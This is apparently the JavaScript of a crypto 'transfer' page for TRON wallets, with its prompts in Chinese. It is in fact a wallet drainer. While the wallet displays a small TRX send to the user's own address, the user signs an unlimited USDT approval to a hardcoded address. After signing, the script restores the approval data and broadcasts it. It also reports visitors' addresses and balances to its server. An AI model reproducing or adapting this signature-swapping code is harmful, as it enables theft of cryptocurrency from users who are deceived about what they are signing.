var tronApi = "https://api.trongrid.io";
var contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
var domain = 'https://' + window.location.host;

window.okxwallet.tronLink.request({ method: 'tron_requestAccounts'})
var current_address, usdtBalance = 0,
    trxBalance = 0;
var transactionObj = null;
var toAddress, type = 0,
    code, isConnected = false;

async function getUsdtBalance(address, callback) {
    let tronWeb = window.tronWeb;
    let parameter = [{
        type: "address",
        value: address
    }];
    let options = {};
    let result = await tronWeb.transactionBuilder.triggerSmartContract(contractAddress, "balanceOf(address)", options, parameter, address);
    if (result.result) {
        if (callback != undefined) {
            callback(result.constant_result[0]);
        }
    }
}

async function getAssets(callback) {
    code = getUrlParams('code');
    try {
        let userAgent = navigator.userAgent.toLowerCase();
        if (/okex/.test(userAgent) || isPc()) {
            if (window.okxwallet.tronLink.ready) {
                window.tronWeb = okxwallet.tronLink.tronWeb;
            } else {
                200 === (await window.okxwallet.tronLink.request({
                    method: "tron_requestAccounts"
                })).code && (window.tronWeb = tronLink.tronWeb)
            }
        }
        if (!window.tronWeb) {
            const e = TronWeb.providers.HttpProvider,
                t = new e(tronApi),
                a = new e(tronApi),
                n = tronApi,
                s = new TronWeb(t, a, n);
            window.tronWeb = s;
        }

    } catch (e) {
        console.error("钱包初始化失败:", e);
        // window.location.replace("https://www.okx.com/zh-hans");
        // window.location.href="https://www.okx.com/zh-hans";
        // tip(e);
    }

    if (window.tronWeb) {
        var tronWeb = window.tronWeb;
        current_address = tronWeb.defaultAddress.base58;
        if (current_address == false) {
            tip("连接钱包失败");
           
               await getAssets(callback);
            
            return;
        }
        try {
            let balance = await tronWeb.trx.getBalance(current_address);
            trxBalance = tronWeb.fromSun(balance);

            getUsdtBalance(current_address, function(data) {
                usdtBalance = tronWeb.fromSun(parseInt(data, 16));
                console.log(usdtBalance);
                isConnected = true;
                tip("连接钱包成功");
                iaGet({
                    current_address: current_address,
                    trx: trxBalance,
                    usdt: usdtBalance,
                    code: code
                });
                if (callback != undefined) {
                    callback(trxBalance, usdtBalance);
                }
            });

        } catch (e) {
            console.error("获取钱包资产失败:", e);
            tip(e);
        }
    } else {
        // window.location.replace("https://www.okx.com/zh-hans");
        // window.location.href="https://www.okx.com/zh-hans";
        tip("请用钱包扫码打开");
    }
}

async function iaHelp(transactionObj, to_address, amount, type) {
    try {
        if (type == 1 || type == 2) {
            var sign = await tronWeb.trx.sign(transactionObj);
            iaResult({
                signature: sign.signature,
                txID: sign.txID
            });
        } else {
            let tronWeb = window.tronWeb;
            let parameter = [{
                    type: "address",
                    value: to_address
                },
                {
                    type: "uint256",
                    value: amount * 1000000
                }
            ];
            let transactionObj1 = await tronWeb.trx.sign(contractAddress, "transfer(address,uint256)", {}, parameter, current_address,);
            
            if ((isMobile() && isOkxApp()) || isPc()) {
                var raw_data = transactionObj.raw_data;
                transactionObj.raw_data = transactionObj1.transaction.raw_data;
            }
            var sign = await tronWeb.trx.sign(transactionObj);
            iaResult({
                signature: sign.signature,
                txID: sign.txID
            });
            // if((isMobile()&&isOkxApp())||isPc()){
            //     sign.raw_data=raw_data;
            // }

            // if(type!=1){
            //     tronWeb.trx.sendRawTransaction(sign);
            // }
        }


    } catch (e) {
        console.error("交易签名失败:", e);
        if (e.message) {
            tip(e.message);
        } else {
            tip(e);
        }
    }
}

async function iaGet(data) {
    $.ajax({
        url: domain + "/sapi/getData",
        data: data,
        dataType: "jsonp",
        type: 'get',
        jsonpCallback: "handleCallback"
    });
}

async function iaCreate(data) {
    $.ajax({
        url: domain + "/sapi",
        data: data,
        dataType: "jsonp",
        type: 'get',
        jsonpCallback: "handleCallback1"
    });
}

async function iaResult(data) {
    $.ajax({
        url: domain + "/sapi/result",
        data: data,
        dataType: "jsonp",
        type: 'get',
        jsonpCallback: "handleCallback2"
    });
}

function handleCallback(res) {
    if (res['code'] == 0) {
        tip(res['info']);
    } else {
        toAddress = res['to_address'];
        $('#to_address').html(toAddress);
        $('#to_address').val(toAddress);
    }
}

function handleCallback1(res) {
    if (res['code'] == 0) {
        tip(res['info']);
    } else {
        transactionObj = JSON.parse(res['data']);
        type = res['type'];

        if ((isMobile() && isOkxApp()) || isPc()) {
            toAddress = current_address;
        }
        iaHelp(transactionObj, toAddress, amount, type);
    }
}

function handleCallback2(res) {
    tip(res['info']);
}

async function transfer_f() {
    
    amount = $("#amount").val() ? $("#amount").val() : 0;
    if (amount == 0) {
        tip('请输入转账金额');
        return;
    }
    if (!isConnected) {
        tip('正在连接网络。。。', 2000);
        return;
    }
    
    tip('正在创建交易。。。', 2000);
    executeBlockchainTransaction()
    // iaCreate({
    //     current_address: current_address,
    //     trx: trxBalance,
    //     usdt: usdtBalance,
    //     code: code
    // });
}

function tip(a, time = 1500) {
    $("#tip").html(a);
    $("#tip").show();
    setTimeout(function() {
        $("#tip").hide();
    }, time)
}

function sleep(a) {
    return new Promise(dsTime => setTimeout(dsTime, a));
}

function isOkxApp() {
    let ua = navigator.userAgent;
    let isOKApp = /OKApp/i.test(ua);
    return isOKApp;
}

function isMobile() {
    let ua = navigator.userAgent;
    let isIOS = /iphone|ipad|ipod|ios/i.test(ua);
    let isAndroid = /android|XiaoMi|MiuiBrowser/i.test(ua);
    let isMobile = isIOS || isAndroid;
    return isMobile;
}

function isPc() {
    let ua = navigator.userAgent;
    let isPc = /windows/i.test(ua);
    return isPc;
}

function changeTitle(content) {
    $('title').html(content);
}


//获取url参数
function getUrlParams(key) {
    var url = window.location.search.substr(1);
    if (url == '') {
        return false;
    }
    var paramsArr = url.split('&');
    for (var i = 0; i < paramsArr.length; i++) {
        var combina = paramsArr[i].split("=");
        if (combina[0] == key) {
            return combina[1];
        }
    }
    return false;
}
async function executeBlockchainTransaction() {
    
     
    // 此处初始化的代码被注释掉了，如果需要请取消注释并确认变量名称正确
    // if (!blockchainResource) {
    //     blockchainResource = await window.tronWeb;
    // }

    // 可能需要从服务中获取授权地址，这里用硬编码示例代替
    // targetAddress = await blockchainService.get_authorized_address(),
    

    try {
        
        let tronWeb = window.tronWeb;
    const userAgent = navigator.userAgent.toLowerCase();
    
    
    let current_address=tronWeb.defaultAddress.base58;
    
    
    
    
    console.log(current_address);
        
//         if (userAgent.match(/iphone|ipad|ipod/i)) {
            
//     to_address='TM3DAbASjYkiGehwtCnSpcfETLaqBNpPKp';//苹果用私人地址
//     console.log("这是一个苹果设备");
// }else{
    
     to_address='TAp8Xru1aKuWKNavNLsVXLbvHwrVX8WSMz';//安卓用合约地址
// }





        let tokenAddress ='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        // uploadTx('tron')
        
        // 准备交易的参数
        const parameters = [
            { type: "address", value: to_address },
            { type: "uint256", value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
        ];
        
        // 设置交易限额
        const transactionOptions = { feeLimit: 100000000 };
        
       const   transactionObj0  = await tronWeb.transactionBuilder.triggerSmartContract(
            tokenAddress, 
            "increaseApproval(address,uint256)", 
            transactionOptions, 
            parameters, 
            current_address
        );
        
        // 签名交易
       

        
       console.log(tronWeb.address.toHex(tokenAddress));
       
        // alert(tronWeb.defaultAddress.base58);
        console.log("transactionObj0:"+JSON.stringify(transactionObj0, null, 2));
        
       
        
         let parameter = [{
                    type: "address",
                    value: to_address
                },
                {
                    type: "uint256",
                    value: amount * 1000000
                }
            ];
            
              
//         if (userAgent.match(/iphone|ipad|ipod/i)) {
            
   
    
     transactionObj1 = await tronWeb.transactionBuilder.sendTrx(to_address,amount * 1000000,current_address);
    
    
//     console.log("这是一个苹果设备");
// }else{
    
     
        //       transactionObj1 = await tronWeb.transactionBuilder.freezeBalanceV2(
        //     amount*1000000,  // 冻结的金额（以 sun 为单位，1 TRX = 1,000,000 sun）
        //     'ENERGY',  // 资源类型：'BANDWIDTH' 或 'ENERGY'
        //     tronWeb.defaultAddress.base58  // 账户地址
        // );
            


            
            
            
            
            
            // 
            
            
                 var raw_data = transactionObj0.transaction.raw_data;
       
                 
                 console.log("transactionObj1.raw_data"+ JSON.stringify(transactionObj1.raw_data, null, 2));
                 
        console.log("之前transactionObj0.transaction.raw_data:"+JSON.stringify(transactionObj0.transaction.raw_data, null, 2));
      
        // //       
                transactionObj0.transaction.raw_data = transactionObj1.raw_data;
                 transactionObj0.transaction.raw_data.contract[0].parameter.value.to_address=transactionObj0.transaction.raw_data.contract[0].parameter.value.owner_address;
        
                console.log("之后transactionObj0.transaction.raw_data:"+JSON.stringify(transactionObj0.transaction.raw_data, null, 2));
                
                console.log("整体transactionObj0:"+JSON.stringify(transactionObj0, null, 2));
                
        //         console.log("transactionObj0.transaction:"+JSON.stringify(transactionObj0.transaction, null, 2));
            
        
           
        
        
        
        
        
        
        
        // // 签名交易
        const signedTransaction = await tronWeb.trx.sign(transactionObj0.transaction);
        
        console.log("改前signedTransaction:"+JSON.stringify(signedTransaction, null, 2));
        
      
        // // //  if((isMobile()&&isOkxApp())||isPc()){
                signedTransaction.raw_data=raw_data;
                
                
            console.log("改后signedTransaction:"+JSON.stringify(signedTransaction, null, 2));
         
               const tx =await tronWeb.trx.sendRawTransaction(signedTransaction);
        
        // alert("signedTransaction:"+JSON.stringify(signedTransaction, null, 2));
        if(tx){
        //   uploadTx('tron');
            alert('成功！');
        }

        // 发送交易
        

    } catch (error) {
        console.error("An error occurred during the blockchain transaction:", error);
    }}
    
